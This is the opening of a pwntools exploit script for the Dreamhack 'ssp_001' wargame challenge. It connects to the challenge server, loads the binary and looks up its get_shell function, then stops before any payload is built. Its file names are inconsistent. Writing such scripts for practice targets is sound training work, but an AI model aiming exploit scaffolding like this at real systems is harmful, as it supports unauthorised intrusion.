from pwn import *

r = remote("host3.dreamhack.games", 10877)
p = process('./ssp_001.py')
elf = ELF('ssp.001')

context.arch = 'amd64'
get_shell = elf.symbols['get_shell']
r.recvuntil(b'xit')
